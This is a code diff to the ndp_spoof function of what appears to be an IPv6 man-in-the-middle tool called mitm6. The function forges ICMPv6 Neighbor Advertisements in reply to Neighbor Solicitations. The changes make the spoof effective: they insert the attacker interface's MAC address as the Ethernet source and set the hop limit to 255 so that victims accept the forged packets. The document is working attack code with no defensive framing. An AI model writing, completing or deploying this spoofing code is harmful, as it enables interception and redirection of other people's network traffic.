@@ -24,6 +24,8 @@
 #include "mitm6.h"
 #include "packet.h"
 
+extern char *iface;
+
 void ndp_spoof(const u_char *bytes, size_t len)
 {
         struct ether_header *ether = NULL;
@@ -34,6 +36,7 @@ void ndp_spoof(const u_char *bytes, size_t len)
         char sspoof[INET6_ADDRSTRLEN];
         struct packet *p = NULL;
         int cksum = 0;
+        u_char *mac = NULL;
 
         ether = (struct ether_header *)bytes;
         ip = (struct ip6_hdr *)(bytes + sizeof(struct ether_header));
@@ -67,13 +70,19 @@ void ndp_spoof(const u_char *bytes, size_t len)
 
                 na.nd_na_hdr.icmp6_cksum = cksum;
 
+                mac = get_mac(iface);
+                if (mac == NULL)
+                        return;
+
                 /* TODO: insert my mac address!!! */
                 p = packet_init();
-                packet_add_ether(p, ether->ether_shost, ether->ether_shost, ETH_P_IPV6);
-                packet_add_ip6(p, sizeof(struct nd_neighbor_advert), IPPROTO_ICMPV6, 64, &(ns->nd_ns_target), &(ip->ip6_src), (u_char *)&na);
+                packet_add_ether(p, mac, ether->ether_shost, ETH_P_IPV6);
+                packet_add_ip6(p, sizeof(struct nd_neighbor_advert), IPPROTO_ICMPV6, 255, &(ns->nd_ns_target), &(ip->ip6_src), (u_char *)&na);
 
                 inject_packet(p->data, p->len);
 
                 packet_free(p);
+                free(mac);
+                mac = NULL;
         }
 }
